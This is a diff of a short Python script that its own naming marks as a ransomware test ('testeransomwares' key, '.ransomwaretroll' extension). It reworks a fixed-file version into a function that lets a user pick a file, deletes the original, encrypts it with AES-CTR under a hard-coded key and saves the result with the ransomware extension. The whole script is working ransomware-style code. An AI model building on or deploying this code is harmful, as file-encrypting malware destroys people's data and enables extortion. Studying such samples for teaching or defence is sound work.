@@ -1,24 +1,36 @@
 import os
 import pyaes
+from tkinter import Tk
+from tkinter.filedialog import askopenfilename
 
-## Abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+def encrypt_file(file_path, key):
+    ## Reads the file
+    with open(file_path, 'rb') as file:
+        file_data = file.read()
 
-## Remover o arquivo
-os.remove(file_name)
+    ## Removes the original file
+    os.remove(file_path)
 
-## Chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+    ## Initializes AES encryption
+    aes = pyaes.AESModeOfOperationCTR(key)
 
-## Criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+    ## Encrypt the file data
+    crypto_data = aes.encrypt(file_data)
 
-## Salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+    ## Saves the encrypted file
+    new_file_path = file_path + '.ransomwaretroll'
+    with open(new_file_path, 'wb') as new_file:
+        new_file.write(crypto_data)
+    print(f'File "{file_path}" encrypted and saved as "{new_file_path}"')
+
+if __name__ == "__main__":
+    ## Asks user to select a file
+    Tk().withdraw() 
+    file_path = askopenfilename(title="Select a file to encrypt")
+
+    if not file_path:
+        print("No file selected. Exiting.")
+    else:
+        ## Key for encryption
+        key = b'testeransomwares'
+        encrypt_file(file_path, key)
